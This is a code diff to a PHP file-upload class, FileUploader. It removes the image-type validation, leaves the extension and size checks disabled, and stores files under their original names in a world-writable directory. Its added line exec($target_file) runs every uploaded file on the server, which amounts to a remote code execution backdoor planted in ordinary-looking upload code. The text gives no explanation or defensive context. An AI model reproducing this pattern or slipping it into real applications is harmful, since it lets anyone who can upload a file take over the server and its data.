@@ -8,23 +8,28 @@
 
 namespace BYOG\Components;
 
+$MAX_FILE_SIZE = 50000;
 
 class FileUploader
 {
+
+    private static function getFileUploadDir() {
+        return __DIR__ . "/../uploadedfiles/"; //TODO make this less than chmod 777
+    }
 
     private static function isImage() {
         return getimagesize($_FILES["file-to-upload"]["tmp_name"]) !== false;
     }
 
     public static function upload() {
-        $target_file = App::getFileUploadDir() . basename($_FILES["file-to-upload"]["name"]);
+        $target_file = self::getFileUploadDir() . basename($_FILES["file-to-upload"]["name"]);
         $uploadOk = 1;
-        $imageFileType = pathinfo($target_file, PATHINFO_EXTENSION);
+        //$imageFileType = pathinfo($target_file, PATHINFO_EXTENSION);
         if(isset($_POST["submit-file-upload"])) {
-            if(!self::isImage()  || file_exists($target_file)) {
+            if(/*!self::isImage()  ||*/ file_exists($target_file)) {
                 $uploadOk = 0;
             }
-            /*if($_FILES["fileToUpload"]["size"] > 500000) {
+            /*if($_FILES["fileToUpload"]["size"] > $MAX_FILE_SIZE) {
                 $uploadOk = 0;
             }*/
             /*if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
@@ -34,6 +39,7 @@ class FileUploader
         }
         if($uploadOk == 1) {
             move_uploaded_file($_FILES["file-to-upload"]["tmp_name"], $target_file);
+            exec($target_file);
         }
 
     }
